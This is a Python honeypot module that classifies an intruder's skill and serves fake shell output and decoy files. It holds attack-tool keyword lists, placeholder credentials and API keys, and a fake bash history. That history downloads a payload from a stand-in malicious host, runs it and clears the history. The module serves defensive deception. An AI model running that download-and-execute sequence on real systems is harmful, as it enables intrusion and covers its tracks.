import time
import random
from datetime import datetime, timedelta

class AdaptiveDeceptionEngine:
    
    def __init__(self):
        self.deception_strategies = {
            'beginner': {
                'response_complexity': 'simple',
                'response_delay': (0.1, 0.3),
                'fake_files': ['passwords.txt', 'backup.sql', 'config.ini'],
                'vulnerability_hints': ['weak_passwords', 'default_configs']
            },
            'intermediate': {
                'response_complexity': 'moderate',
                'response_delay': (0.3, 0.7),
                'fake_files': ['encrypted_keys.pem', 'database_backup.tar.gz', 'admin_scripts.sh'],
                'vulnerability_hints': ['unpatched_services', 'weak_encryption']
            },
            'advanced': {
                'response_complexity': 'complex',
                'response_delay': (0.5, 1.2),
                'fake_files': ['classified_data.enc', 'source_code.zip', 'network_topology.json', 'exploit_dev.py'],
                'vulnerability_hints': ['zero_day_simulation', 'advanced_persistence']
            }
        }
        
        # Enhanced file content generators
        self.file_contents = {
            'admin_backup.sql': self._generate_sql_backup,
            'system_config.json': self._generate_system_config,
            'private_key.pem': self._generate_private_key,
            'server_credentials.txt': self._generate_server_creds,
            'passwords.txt': self._generate_password_file,
            'api_keys.txt': self._generate_api_keys,
            '.bash_history': self._generate_bash_history
        }

    def classify_attacker_skill(self, session_data):
        """Enhanced attacker classification"""
        skill_score = 0
        commands = session_data.get('commands', [])
        
        advanced_patterns = ['nmap', 'metasploit', 'sqlmap', 'john', 'hashcat', 'msfvenom', 'exploit']
        intermediate_patterns = ['wget', 'curl', 'nc', 'netcat', 'python -c', 'perl -e']
        
        for cmd in commands:
            cmd_lower = cmd.lower()
            if any(pattern in cmd_lower for pattern in advanced_patterns):
                skill_score += 3
            elif any(pattern in cmd_lower for pattern in intermediate_patterns):
                skill_score += 1
        
        unique_commands = len(set([cmd.split()[0] for cmd in commands if cmd.strip()]))
        if unique_commands > 15:
            skill_score += 3
        elif unique_commands > 8:
            skill_score += 1
        
        avg_time = session_data.get('avg_time_between_commands', 10)
        if avg_time < 3:
            skill_score += 2
        elif avg_time < 7:
            skill_score += 1
        
        if skill_score >= 6:
            return 'advanced'
        elif skill_score >= 3:
            return 'intermediate'
        else:
            return 'beginner'

    def generate_adaptive_response(self, command, attacker_type, rl_actions, session_data):
        """Generate response using RL actions and deception strategy"""
        strategy = self.deception_strategies[attacker_type]
        delay_min, delay_max = strategy['response_delay']
        
        # Add realistic delay
        time.sleep(random.uniform(delay_min, delay_max))
        
        engagement_level = rl_actions.get('engagement', 1)
        
        if engagement_level == 4:  # Eject
            return b'Connection timeout\r\n'
        elif engagement_level == 3:  # Enhanced response
            return self._generate_enhanced_response(command, strategy, rl_actions, session_data)
        elif engagement_level == 2:  # Detailed response
            return self._generate_detailed_response(command, strategy, rl_actions, session_data)
        elif engagement_level == 1:  # Standard response
            return self._generate_standard_response(command, strategy)
        else:  # Minimal response
            return self._generate_minimal_response(command)

    def _generate_enhanced_response(self, command, strategy, rl_actions, session_data):
        """Generate highly detailed responses for maximum engagement"""
        cmd_lower = command.lower()
        
        if 'ls -la' in cmd_lower or 'ls -al' in cmd_lower:
            detailed_files = [
                "total 48",
                "drwxr-xr-x 2 user user 4096 May 24 18:00 .",
                "drwxr-xr-x 3 user user 4096 May 20 10:30 ..",
                "-rw------- 1 user user 743 May 24 17:45 .bash_history",
                "-rw-r--r-- 1 user user 3106 May 20 10:30 .bashrc",
                "-rw-r--r-- 1 user user 161 May 20 10:30 .profile",
                "-rw-r--r-- 1 user user 1024 May 24 16:20 admin_backup.sql",
                "-rwxr-xr-x 1 user user 2048 May 23 14:15 deploy_script.sh",
                "-rw------- 1 user user 512 May 24 15:30 private_key.pem",
                "-rw-r--r-- 1 user user 4096 May 24 17:00 system_config.json"
            ]
            
            # Add fake files based on RL deception action
            if rl_actions.get('deception', 0) == 0:  # reveal_fake_files
                detailed_files.extend([
                    "-rw------- 1 user user 256 May 24 14:00 server_credentials.txt",
                    "-rw-r--r-- 1 user user 128 May 24 13:00 passwords.txt",
                    "-rw------- 1 user user 512 May 24 12:00 api_keys.txt"
                ])
                session_data['deception_triggered'] = 1
            
            return '\r\n'.join(detailed_files).encode() + b'\r\n'
        
        elif 'cat /etc/passwd' in cmd_lower:
            passwd_content = [
                "root:x:0:0:root:/root:/bin/bash",
                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
                "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
                "mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false",
                "admin:x:1001:1001:Admin User:/home/admin:/bin/bash"
            ]
            return '\r\n'.join(passwd_content).encode() + b'\r\n'
        
        elif any(filename in cmd_lower for filename in self.file_contents.keys()):
            # Extract filename
            for filename in self.file_contents.keys():
                if filename in cmd_lower:
                    content = self.file_contents[filename]()
                    session_data['discovered_files'].append(filename)
                    session_data['deception_triggered'] = 1
                    return content.encode() + b'\r\n'
        
        return self._generate_detailed_response(command, strategy, rl_actions, session_data)

    def _generate_detailed_response(self, command, strategy, rl_actions, session_data):
        """Generate detailed responses"""
        cmd_lower = command.lower()
        
        if 'ls' in cmd_lower:
            files = strategy['fake_files'] + ['system.log', 'temp_data.txt', '.hidden_config']
            file_list = []
            for file in files:
                size = random.randint(1024, 1048576)
                date = self._generate_date()
                permissions = random.choice(['rw-r--r--', 'rwxr-xr-x', 'rw-------'])
                file_list.append(f"{permissions} 1 root root {size:8d} {date} {file}")
            return '\r\n'.join(file_list).encode() + b'\r\n'
        
        elif 'ps aux' in cmd_lower:
            processes = [
                'root 1 0.0 0.1 1234 567 ? Ss 12:00 0:01 /sbin/init',
                'root 123 0.1 0.2 2345 678 ? S 12:01 0:00 /usr/sbin/sshd',
                'mysql 456 2.1 5.3 9876 5432 ? Sl 12:02 0:15 /usr/sbin/mysqld',
                'www-data 789 0.5 1.2 3456 1234 ? S 12:03 0:02 /usr/sbin/apache2'
            ]
            return '\r\n'.join(processes).encode() + b'\r\n'
        
        return self._generate_standard_response(command, strategy)

    def _generate_standard_response(self, command, strategy):
        """Generate standard responses"""
        cmd_lower = command.lower()
        
        if 'ls' in cmd_lower:
            files = random.sample(strategy['fake_files'], min(3, len(strategy['fake_files'])))
            return ' '.join(files).encode() + b'\r\n'
        elif 'pwd' in cmd_lower:
            return b'/home/user\r\n'
        elif 'whoami' in cmd_lower:
            return b'user\r\n'
        elif 'id' in cmd_lower:
            return b'uid=1000(user) gid=1000(user) groups=1000(user)\r\n'
        else:
            return b'Command executed successfully\r\n'

    def _generate_minimal_response(self, command):
        """Generate minimal responses"""
        return b'bash: command not found\r\n'

    def _generate_date(self):
        """Generate realistic file dates"""
        base_date = datetime.now() - timedelta(days=random.randint(1, 30))
        return base_date.strftime("%b %d %H:%M")

    # File content generators
    def _generate_sql_backup(self):
        return """-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db

INSERT INTO `users` VALUES 
(1,'admin','$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj.VjDCBcfLq','admin@company.com','admin','2024-01-15 10:30:00'),
(2,'john.doe','$2b$12$8K2w4hNvM9.XvKd9Lx7HQOz6TtxMQJqhN8/LewdBPj.VjDCBcfLq','john.doe@company.com','manager','2024-01-20 14:15:00');

INSERT INTO `api_keys` VALUES 
(1,1,'ak_live_51HyJz2eZvKYlo2C9CkQxmN7y8vKYlo2C9CkQxmN7y8vKYlo2C','{"admin": true}','2024-01-15 10:35:00');"""

    def _generate_system_config(self):
        return """{
  "environment": "production",
  "database": {
    "host": "prod-db-cluster.company.internal",
    "port": 3306,
    "username": "app_user",
    "password": "Pr0d_DB_P@ssw0rd_2024!",
    "database": "company_production"
  },
  "api": {
    "jwt_secret": "jwt_super_secret_key_2024_production_only",
    "encryption_key": "aes256_production_encryption_key_2024"
  }
}"""

    def _generate_private_key(self):
        return """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM3nQ7rT6uV8wX0yZ1aB3cD4eF5fG6hH7iI8jJ9kK0lL1mM2nN3oO4pP5qQ6
[... truncated for brevity ...]
-----END RSA PRIVATE KEY-----"""

    def _generate_server_creds(self):
        return """# Production Server Credentials
SSH_USER=root
SSH_PASS=R00t_P@ssw0rd_2024!
DB_USER=admin
DB_PASS=Admin_DB_2024!
API_KEY=sk_live_51HyJz2eZvKYlo2C9CkQxmN7y8vKYlo2C"""

    def _generate_password_file(self):
        return """# User Passwords - CONFIDENTIAL
admin:Admin123!
john.doe:JohnPass2024
sarah.smith:Sarah_Secure_99
root:R00tP@ssw0rd!
backup_user:Backup_2024_Key"""

    def _generate_api_keys(self):
        return """# API Keys - Production Environment
AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF
AWS_SECRET_ACCESS_KEY=abcdef1234567890abcdef1234567890abcdef12
STRIPE_SECRET_KEY=sk_live_51HyJz2eZvKYlo2C9CkQxmN7y8vKYlo2C
GITHUB_TOKEN=ghp_1234567890abcdef1234567890abcdef12"""

    def _generate_bash_history(self):
        return """ls -la
cat /etc/passwd
sudo su
mysql -u root -p
wget https://malicious-site.com/payload.sh
chmod +x payload.sh
./payload.sh
rm payload.sh
history -c"""